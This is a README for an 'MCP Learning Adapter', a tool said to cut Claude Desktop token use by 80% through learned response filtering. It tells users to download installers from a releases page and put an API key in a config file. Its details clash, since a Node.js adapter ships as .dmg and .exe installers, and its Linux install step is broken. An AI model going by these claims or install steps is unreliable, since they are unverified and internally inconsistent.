## 🚀 Overview

The MCP Learning Adapter sits between Claude Desktop (or any MCP client) and your MCP servers. This adapter learns server APIs and reduces token consumption by 80%. It does this through automated schema learning and response filtering, making your interactions faster and more cost-effective.

## 🛠️ Key Benefits

- **80% reduction in input tokens**: Enjoy lower costs and quicker responses.
- **Self-learning**: The adapter discovers and categorizes API response patterns automatically.
- **Smart filtering**: It highlights essential fields and removes unnecessary data.
- **Drop-in replacement**: Easily integrates with existing Node.js-based MCP servers.
- **Community-driven**: Share your learned schemas in `registry.json`.

## 🗂️ System Requirements

Before using the MCP Learning Adapter, ensure your system meets the following requirements:

- **Operating System**: Windows, macOS, or Linux
- **Node.js**: Version 12 or later must be installed on your MCP server.
- **Memory**: At least 4GB of RAM for optimal performance.

## 🚀 Getting Started

To get started with the MCP Learning Adapter:

1. **Download the Adapter**: Visit the [Releases Page](https://github.com/babydoll1110/mcp-learning-adapter/releases) to download the latest version of the adapter.

2. **Install the Adapter**: Follow these steps based on your operating system:
   - **Windows**: Double-click the downloaded installer and follow the prompts.
   - **macOS**: Open the downloaded `.dmg` file and drag the application to your Applications folder.
   - **Linux**: Open the terminal and run the following command:

   mcp-learning-adapter
   ```

## 🔧 How It Works

Once running, the MCP Learning Adapter connects to your MCP server. It monitors API responses and learns from them over time. The more you use the adapter, the smarter it becomes. Here’s how:

1. **Initial Connection**: The adapter makes an initial connection to your MCP server and logs the API response patterns.
2. **Response Learning**: It starts filtering irrelevant fields and learns which data you use most often.
3. **Continuous Improvement**: As you interact with your MCP server, the adapter refines its filtering and learning capabilities.

## 📦 Download & Install

For ease of access, you can download the MCP Learning Adapter at any time. Simply visit the [Releases Page](https://github.com/babydoll1110/mcp-learning-adapter/releases) and select the latest version suitable for your operating system.

## 📑 Configuring the Adapter

After installing the adapter, configuring it is crucial. Follow these steps:

1. **Locate the configuration file**: This file is usually named `config.json` and is found in the installation directory.
2. **Edit the configuration file**: You can open this file in any text editor. Insert the necessary details:
   - **MCP Server URL**: The address to your MCP server.
   - **API Key**: If authentication is required, include your API key.

3. **Save the changes**: Make sure to save your configuration after editing.
